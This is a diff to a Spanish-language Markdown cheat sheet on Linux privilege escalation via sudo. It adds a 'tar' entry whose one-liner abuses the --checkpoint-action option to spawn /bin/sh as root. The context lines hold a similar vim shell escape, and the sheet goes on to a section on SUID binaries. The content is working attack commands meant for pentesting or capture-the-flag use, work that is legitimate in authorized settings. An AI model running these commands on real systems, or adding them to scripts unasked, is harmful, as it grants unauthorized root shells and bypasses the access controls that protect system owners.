@@ -52,6 +52,12 @@ sudo -u {usuario} {comando}
 ```bash
 sudo vim -c ':!/bin/sh'
 ```
+
+## tar
+
+```bash
+sudo /bin/tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
+```
 ---
 
 # Binarios SUID
